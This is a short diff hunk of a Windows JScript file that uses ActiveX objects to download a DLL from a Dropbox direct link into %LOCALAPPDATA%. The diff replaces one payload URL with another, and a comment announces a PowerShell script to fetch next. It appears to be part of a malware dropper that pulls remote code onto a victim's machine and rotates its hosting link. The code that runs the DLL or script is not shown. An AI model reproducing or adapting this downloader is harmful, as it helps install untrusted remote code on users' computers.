@@ -4,7 +4,7 @@ try {
     var fso = new ActiveXObject("Scripting.FileSystemObject");
 
     // Define URL and target file path for the DLL
-    var dllUrl = "https://www.dropbox.com/scl/fi/1vos32664821c9kwu4rrv/ANCIENT_CANVAS.dll?rlkey=ssokz83a932t4arjja976bto7&st=e83e72qh&dl=1";
+    var dllUrl = "https://www.dropbox.com/scl/fi/g6zc6u29hv29mjfmncwka/COHERENT_GOGGLES.dll?rlkey=w667j1ar8o9gdjinpo48xvhfx&st=m6d0ezpb&dl=1";
     var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\ANCIENT_CANVAS.dll");
 
     // Define URL and target file path for the PowerShell script
